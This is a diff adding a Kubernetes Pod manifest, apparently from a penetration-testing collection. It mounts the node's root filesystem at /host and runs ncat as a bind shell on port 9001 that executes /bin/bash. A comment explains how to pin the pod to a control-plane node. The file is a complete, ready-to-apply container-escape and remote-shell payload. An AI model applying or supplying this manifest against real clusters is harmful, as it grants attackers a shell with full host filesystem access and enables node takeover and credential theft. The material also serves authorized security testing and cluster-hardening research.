@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-bind-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: hostpath-bind-pod
+    image: raesene/ncat
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    args: ['-lnvp', '9001', '-e', '/bin/bash']
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
